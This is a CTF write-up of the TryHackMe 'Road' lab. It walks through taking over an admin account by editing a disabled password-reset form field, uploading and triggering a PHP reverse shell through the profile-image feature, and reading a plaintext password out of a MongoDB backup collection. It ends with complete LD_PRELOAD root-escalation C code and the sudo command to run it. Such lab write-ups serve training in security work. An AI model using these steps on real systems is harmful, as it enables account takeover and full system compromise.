---
title: "[TryHackMe] Road"
author: Tri Nguyen
date: 2021-11-30 20:40:00 -0700
categories: [CTF, Write Up]
tags: [ctf, write-up, tryhackme, road, thm]
---

# Enumeration

## nmap

- Port 80 and 22 open

## gobuster

- No stand out dirs.

## OWASP ZAP

- Path traversal detected but I think this is false positive.

## Manual enumeration:

- Created an account: sky@thm.com | password

- If you go to your edit profile, scroll down, you will see a line, under uploading profile image saying

    > `Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.`
    > We found the admin account's username + this maybe where we upload a reverse shell.

- Reset Password doesn't seem to check anything. I will use Burp to intercept this request and change the pw for the admin account

    > Actually I decided to edit the disabled form field on the website, replacing my account's username with the admin's username. This is easier and faster!

- Password change successfully!

- I uploaded the pentestmonkey's `php_reverse_shell.php` but I didn't know where to activate the php.

    > Clicking on the avatar wasn't working
    > Try /assets/img but our php wasn't there - might be extension checking?

- I viewed the edit profile page's source, there is a hidden url called `/v2/profileimages` which disable dir listing.

    > But we know the file's name!
    > Tried `http://10.10.86.228/v2/profileimages/php-reverse-shell.php`

- PWNED!

# Reverse Shell

- There is an account called "webdeveloper". 

- You can file the user.txt in the home directory.

- I tried enum around using the "www-data" but nothing was working.

- No .ssh folder we can use.

- `cat /etc/passwd` you will see 2 accounts: `mysql` and `mongo`

    > Try running `mysql` not working
    > However `mongo` works

- I used the commands on mongo's shell documentation.

```
show databases;
use backup; # only this one worked
show collections; # will show user as a collection
db.user.find()
```

- This will list all the backup users:

```
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

# SSH

```shell
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility

```

- Notice `env_keep+=LD_PRELOAD` is set.

- Comiple a c file with this content

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

- Then run

```shell
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
sudo LD_PRELOAD=exploit.so /usr/bin/sky_backup_utility
```